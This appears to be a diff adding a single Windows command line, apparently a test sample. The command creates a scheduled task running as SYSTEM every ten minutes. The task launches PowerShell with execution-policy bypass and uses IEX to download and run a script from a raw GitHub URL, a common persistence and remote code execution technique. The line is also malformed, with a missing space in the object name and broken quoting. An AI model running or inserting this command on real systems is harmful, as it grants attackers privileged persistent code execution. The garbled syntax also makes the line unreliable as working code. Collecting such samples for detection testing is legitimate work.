@@ -1,0 +1,1 @@
+Schtasks /create /ru system /sc MINUTE /mo 10 /tn MaTacheplanifiee /tr "powershell -nop -ep bypass -c 'IEX ((new-objectnet.webclient).downloadstring(https://raw.githubusercontent.com/squentel/mysamples/main/testtp.ps1 '))'" /F 
